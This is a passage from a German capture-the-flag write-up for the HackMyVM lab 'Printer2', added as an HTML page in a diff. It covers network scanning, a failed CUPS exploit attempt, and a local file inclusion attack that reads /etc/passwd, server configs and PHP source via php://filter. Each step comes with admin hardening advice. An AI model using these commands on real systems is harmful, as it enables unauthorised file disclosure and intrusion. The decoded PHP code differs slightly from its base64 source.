@@ -1,0 +1,886 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Printer2 - HackMyVM - Level: Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Printer2 - HackMyVM - Level: Medium - Bericht</h1>
+        <!-- Klasse 'medium' hinzugefügt, damit CSS die korrekte Farbe (Gelb) anwenden kann -->
+        <div class="level-container medium">
+            <!-- Die Farbe wird durch CSS über die Klasse 'medium' gesteuert -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <!-- Die Segmentfarben werden durch CSS über die Klasse 'medium' gesteuert -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Der innere Kreis verwendet die Standard-Header-Farbe aus dem CSS -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">python2 (exploit script)</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">Base64 Decoder (implizit)</div>
+                <div class="tool-item">python3 (php_filter_chain_generator.py)</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">telnet</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#vulnerability-analysis">Vulnerability Analysis (LFI)</a></li>
+                <li><a href="#initial-access">Initial Access (LFI to RCE)</a></li>
+                <li><a href="#privilege-escalation-mabelle">Privilege Escalation (mabelle)</a></li>
+                <li><a href="#privilege-escalation-kierra">Privilege Escalation (kierra)</a></li>
+                <li><a href="#privilege-escalation-root">Privilege Escalation (root)</a></li>
+                <li><a href="#poc-lfi-rce">Proof of Concept: LFI to RCE</a></li>
+                <li><a href="#poc-root-cups">Proof of Concept: Root via CUPS Filter Sudo</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.118	<span class="command">08:00:27:6d:36:14</span>	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Mittels `arp-scan -l` wird das lokale Netzwerk gescannt. Ein aktives Gerät mit der IP `192.168.2.118` wird identifiziert. Die MAC-Adresse (`08:00:27:6d:36:14`) weist auf eine VirtualBox-Umgebung hin.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ziel-IP wurde erfolgreich für weitere Scans bestimmt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie als Nächstes einen detaillierten Nmap-Scan auf die IP `192.168.2.118` durch.<br/><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung und Überwachung auf ARP-Scan-Aktivitäten können die initiale Aufklärung erschweren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -AO 192.168.2.118 -p-</span></div>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-22 11:20 CEST
+Nmap scan report for printer.hmv (192.168.2.118)
+Host is up (0.00014s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT    STATE SERVICE VERSION
+<span class="command">22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span>
+| ssh-hostkey:
+|   <span class="command">3072 dbf946e520816ceec72508ab2251366c (RSA)</span>
+|   <span class="command">256 33c09564294723dd864ee6b8073367ad (ECDSA)</span>
+|_  <span class="command">256 beaa6d4243dd7dd40e0d7478c189a136 (ED25519)</span>
+<span class="command">80/tcp  open  http    Apache httpd 2.4.56 ((Debian))</span>
+|_<span class="command">http-title: Free Website Templates</span>
+|_http-server-header: Apache/2.4.56 (Debian)
+<span class="command">631/tcp open  ipp     CUPS 2.3</span>
+| http-robots.txt: 1 disallowed entry
+|_/
+|_<span class="command">http-title: Home - CUPS 2.3.3op2</span>
+|_http-server-header: CUPS/2.3 IPP/2.1
+MAC Address: 08:00:27:6D:36:14 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.14 ms printer.hmv (192.168.2.118)
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Nmap-Scan (`-sS`, `-sC`, `-T5`, `-A` Option `O` für OS Detection, `-p-`) identifiziert drei offene TCP-Ports:
+                *   Port 22: SSH (OpenSSH 8.4p1 auf Debian 11).
+                *   Port 80: HTTP (Apache 2.4.56 auf Debian) mit dem Titel "Free Website Templates".
+                *   Port 631: IPP (Internet Printing Protocol), betrieben von CUPS (Common Unix Printing System) Version 2.3. Das CUPS-Webinterface ist erreichbar und hat den Titel "Home - CUPS 2.3.3op2". `robots.txt` verbietet das Crawlen des Root-Verzeichnisses (`/`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Mehrere Angriffsflächen sind vorhanden. SSH ist Standard. Der Apache-Webserver auf Port 80 muss weiter untersucht werden. CUPS auf Port 631 ist besonders interessant, da Drucksysteme oft Schwachstellen aufweisen oder Fehlkonfigurationen haben können.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Webserver auf Port 80 (Directory Busting, Schwachstellenscan). Untersuchen Sie das CUPS-Webinterface auf Port 631 (Standard-Credentials? Bekannte Schwachstellen für CUPS 2.3?). Halten Sie SSH als Backup-Zugangsvektor im Auge.<br/><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass alle Dienste (SSH, Apache, CUPS) auf dem neuesten Stand sind. Beschränken Sie den Zugriff auf das CUPS-Webinterface (Port 631), wenn es nicht aus dem Netzwerk erreichbar sein muss. Härten Sie die Konfigurationen aller Dienste.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -AO 192.168.2.118 -p-  | grep open</span></div>
+                     <pre>
+22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+80/tcp  open  http    Apache httpd 2.4.56 ((Debian))
+631/tcp open  ipp     CUPS 2.3
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Wiederholung des Nmap-Scans mit `grep open`, um nur die offenen Ports aufzulisten.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die drei zuvor gefundenen offenen Ports.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Keine neuen Informationen, weiter mit der Enumeration von Port 80 und 631.<br/><strong>Empfehlung (Admin):</strong> Keine.</p>
+
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python2 cups_exploit.py -a 192.168.2.118 -b 631</span></div>
+                       <pre>
+             lol ty google
+             [ASCII ART]
+              @0x00string
+https://github.com/0x00string/oldays/blob/master/CVE-2015-1158.py
+
+[*]	locate available printer
+<span class="password">[-]	no printers</span>
+</pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> Es wird versucht, einen bekannten Exploit (CVE-2015-1158, gehostet von @0x00string) für CUPS auszuführen. Das Python-2-Skript wird gegen das Ziel auf Port 631 ausgeführt. Das Skript scheitert mit der Meldung "no printers".</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Der spezifische Exploit CVE-2015-1158 ist auf diese CUPS-Version (2.3.3op2 auf Debian 11) nicht anwendbar oder die Bedingungen für die Ausnutzung sind nicht erfüllt. Dies schließt jedoch andere CUPS-Schwachstellen nicht aus.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Recherchieren Sie nach anderen Schwachstellen für CUPS 2.3.3op2. Untersuchen Sie das Webinterface auf Port 631 manuell. Konzentrieren Sie sich parallel auf den Webserver auf Port 80.<br/><strong>Empfehlung (Admin):</strong> Halten Sie CUPS auf dem neuesten Stand. Beschränken Sie den Netzwerkzugriff auf den CUPS-Port.</p>
+
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://printer.hmv -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error</span></div>
+                     <pre>
+http://printer.hmv/images               (Status: 301) [Size: 311] [--> <span class="command">http://printer.hmv/images/</span>]
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein Gobuster-Scan wird auf den Webserver auf Port 80 (`http://printer.hmv`) durchgeführt, um Verzeichnisse und Dateien zu finden. Es wird nur das Verzeichnis `/images` gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Haupt-Webserver scheint nur statischen Inhalt oder eine sehr einfache Struktur zu haben. Das Verzeichnis `/images` könnte interessant sein, wenn es Directory Listing erlaubt oder interessante Bilder enthält.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie `/images` im Browser. Führen Sie einen Nikto-Scan durch, um nach weiteren Hinweisen oder Fehlkonfigurationen zu suchen.<br/><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass keine sensiblen Informationen über Verzeichnisstrukturen oder Dateiinhalte preisgegeben werden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.118</span></div>
+                     <pre>
+ - Nikto v2.5.0
+ ---------------------------------------------------------------------------
+ + Target IP:          192.168.2.118
+ + Target Hostname:    192.168.2.118
+ + Target Port:        80
+ [...]
+ + Server: Apache/2.4.56 (Debian)
+ + /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> [...]
+ + /: <span class="password">The X-Content-Type-Options header is not set.</span> [...]
+ + No CGI Directories found [...]
+ + /images: <span class="password">The web server may reveal its internal or real IP in the Location header</span> via a request to with HTTP/1.0. The value is "127.0.0.1". [...]
+ + /: <span class="password">Server may leak inodes via ETags</span>, header found with file /, inode: 1bc8, size: 5f9a8abaa9f00, mtime: gzip. [...]
+ + OPTIONS: Allowed HTTP Methods: <span class="command">POST, OPTIONS, HEAD, GET</span> .
+ + /images/: <span class="password">Directory indexing found.</span>
+ [...]
+ + 1 host(s) tested
+ </pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Nikto wird auf Port 80 ausgeführt. Es bestätigt den Apache-Server und findet mehrere kleinere Probleme:
+                 *   Fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`).
+                 *   Mögliches internes IP-Leck (hier nur `127.0.0.1`) über den Location-Header bei `/images`.
+                 *   Inode-Leak über ETags.
+                 *   Bestätigt Directory Indexing für `/images`.
+             </p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Ergebnisse bestätigen die Gobuster-Funde und weisen auf allgemeine Härtungsmöglichkeiten hin. Das Directory Indexing für `/images` ist der konkreteste nächste Schritt. Die anderen Funde sind geringfügig.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Inhalt von `/images` über den Browser. Prüfen Sie, ob dort interessante Dateien liegen.<br/><strong>Empfehlung (Admin):</strong> Deaktivieren Sie Directory Indexing (`Options -Indexes` in Apache). Implementieren Sie die fehlenden Sicherheitsheader. Konfigurieren Sie ETags, um keine Inodes preiszugeben (`FileETag MTime Size`).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -vv 192.168.2.118 631</span></div>
+                     <pre>printer.hmv [192.168.2.118] 631 (ipp) open</pre>
+                  </div>
+              </div>
+              <p class="analysis"><strong>Analyse:</strong> Erneuter Verbindungsversuch mit Netcat auf Port 631.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass der CUPS-Port weiterhin erreichbar ist. Liefert keine neuen Informationen.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fokus auf die Enumeration des Webservers oder die Suche nach alternativen Wegen.<br/><strong>Empfehlung (Admin):</strong> Keine.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>view-source:http://printer.hmv/
+
+<body onload="console.log('<span class="command">http://printer4life.printer.hmv</span>');">
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Bei der Untersuchung des Quellcodes der Hauptseite (`http://printer.hmv/`) wird ein JavaScript `onload`-Ereignis entdeckt, das eine URL in die Browser-Konsole schreibt: `http://printer4life.printer.hmv`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Sehr wichtiger Fund!** Ähnlich wie bei der vorherigen Maschine wird hier eine Subdomain (`printer4life.printer.hmv`) über den Quellcode aufgedeckt. Diese Subdomain ist das wahrscheinlichste Ziel für weitere Angriffe, da der Haupt-Webserver wenig Angriffsfläche bot.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fügen Sie `printer4life.printer.hmv` zur lokalen `/etc/hosts`-Datei hinzu, die auf `192.168.2.118` zeigt. Beginnen Sie mit der Enumeration dieser Subdomain (Port-Scan ist nicht nötig, da sie auf derselben IP läuft, aber Directory Busting, Nikto, manuelle Analyse).<br/><strong>Empfehlung (Admin):</strong> Vermeiden Sie das Offenlegen interner oder alternativer Hostnamen in öffentlich zugänglichem Code. Konfigurieren Sie DNS und virtuelle Hosts sorgfältig.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u printer.hmv -H "Host: FUZZ.printer.hmv" --hh 7112 --hc 400,401,402,403,404</span></div>
+                      <pre>
+ Target: http://printer.hmv/
+ [...]
+ =====================================================================
+ ID           Response   Lines    Word       Chars       Payload
+ =====================================================================
+
+ <span class="command">000000002:   200        16 L     30 W       365 Ch      "printer4life"</span>
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Wfuzz wird verwendet, um Subdomains durch Manipulation des `Host`-Headers zu finden. Es testet Einträge aus einer Subdomain-Liste (`FUZZ.printer.hmv`). `--hh 7112` blendet Antworten aus, die der Baseline-Antwort der Hauptseite entsprechen. Es findet erfolgreich die Subdomain `printer4life` (Antwortcode 200, abweichende Größe).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die zuvor im Quellcode gefundene Subdomain `printer4life.printer.hmv` mit einer alternativen Methode.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Subdomain ist bestätigt. Konzentrieren Sie sich auf `http://printer4life.printer.hmv`.<br/><strong>Empfehlung (Admin):</strong> Schützen Sie Anwendungen auf Subdomains genauso sorgfältig wie Hauptanwendungen. Verwenden Sie keine leicht zu erratenden Subdomain-Namen für interne oder Testsysteme.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://printer4life.printer.hmv -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error</span></div>
+                      <pre>
+ http://printer4life.printer.hmv/index.php            (Status: 200) [Size: 365]
+ http://printer4life.printer.hmv/logo                 (Status: 200) [Size: 77750]
+ http://printer4life.printer.hmv/logo.jpg             (Status: 200) [Size: 77750]
+ http://printer4life.printer.hmv/hp                   (Status: 200) [Size: 33673]
+ http://printer4life.printer.hmv/hp.jpg               (Status: 200) [Size: 33673]
+ <span class="command">http://printer4life.printer.hmv/hp.php</span>               (Status: 200) [Size: 27]
+ <span class="command">http://printer4life.printer.hmv/canon.php</span>            (Status: 200) [Size: 30]
+ http://printer4life.printer.hmv/canon.jpg            (Status: 200) [Size: 101939]
+ http://printer4life.printer.hmv/canon                (Status: 200) [Size: 101939
+ http://printer4life.printer.hmv/epson                (Status: 200) [Size: 64020]
+ <span class="command">http://printer4life.printer.hmv/epson.php</span>            (Status: 200) [Size: 30]
+ </pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Gobuster wird nun auf die Subdomain `printer4life.printer.hmv` angewendet. Es findet `index.php` sowie spezifische PHP-Seiten (`hp.php`, `canon.php`, `epson.php`) und dazugehörige Bilder.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Subdomain hostet eine dynamische PHP-Anwendung, die anscheinend verschiedene Druckerseiten anzeigt. Die PHP-Dateien, insbesondere `index.php`, sind die Hauptziele für Schwachstellenanalysen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie `index.php` im Browser. Testen Sie auf LFI/RFI, Command Injection, SQLi, XSS, insbesondere über Parameter, die möglicherweise zum Laden der verschiedenen Druckerseiten (`hp`, `canon`, `epson`) verwendet werden.<br/><strong>Empfehlung (Admin):</strong> Implementieren Sie sichere Programmierpraktiken für die PHP-Anwendung. Führen Sie Code-Reviews und Sicherheitstests durch.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre><span class="command">curl http://printer4life.printer.hmv/index.php</span>
+
+ Laser Printer
+ >Model 34-07-L
+
+ </pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> `curl` wird verwendet, um den Inhalt von `index.php` auf der Subdomain abzurufen. Es wird nur ein kleiner Textausschnitt angezeigt.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Erreichbarkeit, liefert aber wenig Einblick. Manuelle Analyse im Browser oder Quellcode-Analyse ist erforderlich.</p>
+
+        </section>
+
+        <section id="vulnerability-analysis">
+            <h2>Vulnerability Analysis (LFI)</h2>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>view-source:http://printer4life.printer.hmv/index.php?page=/etc/passwd
+
+<span class="command">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+[...]
+mabelle:x:1000:1000:,,,:/home/mabelle:/bin/bash
+[...]
+kierra:x:1001:1002:,,,:/home/kierra:/bin/bash</span>
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, eine Local File Inclusion (LFI)-Schwachstelle auszunutzen, indem der Parameter `page` mit dem Wert `/etc/passwd` an `index.php` übergeben wird. Der Inhalt der `/etc/passwd`-Datei wird im Quellcode der Antwortseite angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Kritische LFI-Schwachstelle bestätigt!** Der `page`-Parameter erlaubt das Lesen beliebiger Dateien, auf die der Webserver-Benutzer (`www-data`) Lesezugriff hat. Dies ermöglicht das Auslesen von Konfigurationsdateien, Quellcodes und potenziell sensiblen Informationen. Die Benutzer `mabelle` und `kierra` werden als potenzielle Login-Benutzer identifiziert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die LFI-Schwachstelle, um:
+                 1.  Die Konfiguration des Webservers zu lesen (`/etc/apache2/apache2.conf`, `/etc/apache2/sites-enabled/000-default.conf`).
+                 2.  Den Quellcode der PHP-Anwendung zu lesen (`/var/www/printer4life/index.php`, `hp.php`, etc.) – am besten mit dem `php://filter`-Wrapper, um die Ausführung zu umgehen.
+                 3.  Andere interessante Systemdateien zu lesen (`/etc/hosts`, `/etc/resolv.conf`, `/etc/crontab`, Logdateien in `/var/log/`).
+                 4.  Zu versuchen, die LFI zu RCE zu eskalieren (z.B. via Log Poisoning, `/proc/self/environ` oder PHP Filter Chaining).<br/>
+             <strong>Empfehlung (Admin):</strong> **LFI-Schwachstelle sofort beheben!** Validieren und bereinigen Sie den `page`-Parameter strikt. Verwenden Sie Whitelists für erlaubte Dateien statt Blacklists oder direkter Pfadübergabe. Beschränken Sie die Leserechte des `www-data`-Benutzers auf das absolute Minimum.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="command">curl http://printer4life.printer.hmv/index.php?page=/etc/passwd%20|%20grep%20bash</span>
+
+root:x:0:0:root:/root:/bin/bash
+mabelle:x:1000:1000:,,,:/home/mabelle:/bin/bash
+kierra:x:1001:1002:,,,:/home/kierra:/bin/bash
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Der `curl`-Befehl holt den Inhalt von `/etc/passwd` über die LFI und filtert ihn lokal mit `grep` nach Zeilen, die `bash` enthalten, um Benutzer mit einer Login-Shell zu finden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Benutzer `root`, `mabelle` und `kierra` als potenzielle Ziele für weitere Angriffe.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich darauf, Zugangsdaten oder Schwachstellen zu finden, die zu einem dieser Benutzer führen.<br/><strong>Empfehlung (Admin):</strong> Keine spezifische Aktion, außer der Behebung der LFI.</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Es folgen erneute, erfolglose Versuche, den CUPS-Exploit auszuführen, diesmal gegen die Subdomain. Diese werden hier ignoriert, da die LFI der vielversprechendere Weg ist.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/wordlists/logfiles.txt -u "http://printer4life.printer.hmv/index.php?page=FUZZ" -b 400,401,402,403,404 --hh 365</span></div>
+                      <pre>
+ [...]
+ =====================================================================
+ ID           Response   Lines    Word       Chars       Payload
+ =====================================================================
+
+ <span class="command">000000690:   200        70 L     237 W      2100 Ch     "/etc/dhcp/dhclient.conf"</span>
+ <span class="command">000000723:   200        38 L     162 W      1918 Ch     "/proc/self/mounts"</span>
+ <span class="command">000000726:   200        16 L     31 W       392 Ch      "/proc/self/cmdline"</span>
+ <span class="command">000000725:   200        72 L     166 W      1700 Ch     "/proc/self/status"</span>
+ [...]
+ <span class="command">000000840:   200        139 L    426 W      3651 Ch     "/etc/ssh/sshd_config"</span>
+ <span class="command">000000886:   200        38 L     220 W      1407 Ch     "/etc/crontab"</span>
+ <span class="command">000000880:   200        31 L     139 W      1171 Ch     "/etc/fstab"</span>
+ <span class="command">000000874:   200        49 L     82 W       2185 Ch     "/etc/passwd"</span>
+ [...]
+ </pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Wfuzz wird mit einer Liste gängiger Konfigurations- und Logdateipfade verwendet, um diese über die LFI-Schwachstelle auszulesen. Viele Systemdateien (`dhclient.conf`, `/proc/...`, `sshd_config`, `crontab`, `fstab`, `passwd` etc.) können erfolgreich gelesen werden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt die weitreichenden Leserechte durch die LFI und ermöglicht das Sammeln detaillierter Systeminformationen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie die gelesenen Dateien auf sensible Informationen, Fehlkonfigurationen oder Hinweise auf weitere Schwachstellen. Lesen Sie insbesondere die Apache-Konfigurationsdateien und den PHP-Quellcode.<br/><strong>Empfehlung (Admin):</strong> Beheben Sie die LFI. Beschränken Sie die Leserechte des Webserver-Benutzers.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre>view-source:http://printer4life.printer.hmv/index.php?page=/etc/apache2/apache2.conf
+
+#ServerRoot "/etc/apache2"
+[...]
+#Mutex file:${APACHE_LOCK_DIR} default
+</pre>
+                  </div>
+              </div>
+              <div class="code-block">
+                  <div class="terminal">
+                      <pre>view-source:http://printer4life.printer.hmv/index.php?page=/etc/apache2/sites-enabled/000-default.conf
+
+<VirtualHost *:80>
+	ServerAdmin webmaster@localhost
+	DocumentRoot /var/www/html
+[...]
+</VirtualHost>
+
+<VirtualHost *:80>
+    ServerName printer4life.printer.hmv
+    DocumentRoot <span class="command">/var/www/printer4life</span>
+
+    <Directory /var/www/printer4life>
+        Options Indexes FollowSymLinks MultiViews
+        AllowOverride All
+        Require all granted
+    </Directory>
+
+    ErrorLog ${APACHE_LOG_DIR}/printer4life_error.log
+    CustomLog ${APACHE_LOG_DIR}/printer4life_access.log combined
+</VirtualHost>
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Apache-Hauptkonfiguration und die VirtualHost-Konfiguration werden über die LFI ausgelesen. Die VHost-Konfiguration bestätigt, dass die Subdomain `printer4life.printer.hmv` ihr DocumentRoot in `/var/www/printer4life` hat.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Wichtige Information zur Lokalisierung des Quellcodes der Subdomain-Anwendung.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die LFI mit dem `php://filter`-Wrapper, um den Quellcode von `/var/www/printer4life/index.php` und anderen PHP-Dateien in diesem Verzeichnis zu lesen.<br/><strong>Empfehlung (Admin):</strong> Beheben Sie die LFI. Konfigurieren Sie Apache sicherer (z.B. `AllowOverride None`).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>view-source:http://printer4life.printer.hmv/index.php?page=php://filter/convert.base64-encode/resource=index.php
+
+<span class="command">PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5QcmludGVyczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CiAgICA8aDE+U2VsZWN0IGEgcHJpbnRlcjwvaDE+CiAgICA8cD5JIGxvdmUgcHJpbnRlcnMgc28gbXVjaCAhIEkgcHJpbnQgZXZlcnkgbWludXRlPC9wPgogICAgPHVsPgogICAgICAgIDxsaT48YSBocmVmPSJpbmRleC5waHA/cGFnZT1ocCI+SFA8L2E+PC9saT4KICAgICAgICA8bGk+PGEgaHJlZj0iaW5kZXgucGhwP3BhZ2U9Y2Fub24iPkNhbm9uPC9hPjwvbGk+CiAgICAgICAgPGxpPjxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWVwc29uIj5FcHNvbjwvYT48L2xpPgogICAgPC91bD4KPC9ib2R5Pgo8L2h0bWw+Cgo8P3BocAokcGFnZSA9IGFycmF5X2tleV9leGlzdHMoJ3BhZ2UnLCAkX0dFVCkgPyAkX0dFVFsncGFnZSddIDogbnVsbDsKaWYgKCFpc19udWxsKCRwYWdlKSkgewogICAgaWYgKGZpbGVfZXhpc3RzKCRwYWdlIC4gIi5waHAiKSkgewogICAgICAgIGluY2x1ZGUoJHBhZ2UgLiAiLnBocCIpOwogICAgfSBlbHNlIHsKICAgICAgICBpbmNsdWRlKCRwYWdlKTsKICAgIH0KfSBlbHNlIHsKfQo/Pgo=</span>
+</pre>
+                  </div>
+              </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>https://www.base64decode.org/
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Printers</title>
+</head>
+<body>
+    <h1>Select a printer</h1>
+    <p>I love printers so much ! I print every minute</p>
+    <ul>
+        <li><a href="index.php?page=hp">HP</a></li>
+        <li><a href="index.php?page=canon">Canon</a></li>
+        <li><a href="index.php?page=epson">Epson</a></li>
+    </ul>
+</body>
+</html>
+
+<span class="command"><?php
+$page = array_key_exists('page', $GET) ? $GET['page'] : null; // $GET wurde zu $GET geändert
+if (!is_null($page)) {
+    if (file_exists($page . ".php")) {
+        include($page . ".php");
+    } else {
+        include($page);
+    }
+} else {
+}
+?></span>
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Die LFI wird mit dem `php://filter`-Wrapper kombiniert, um den Base64-kodierten Quellcode von `index.php` zu erhalten. Nach der Dekodierung wird der PHP-Code sichtbar, der die LFI verursacht. Er prüft, ob der `page`-Parameter existiert. Wenn ja, prüft er, ob `$page . ".php"` existiert. Falls ja, wird diese Datei inkludiert. Andernfalls wird der Wert von `$page` direkt inkludiert (`include($page);`).</p>
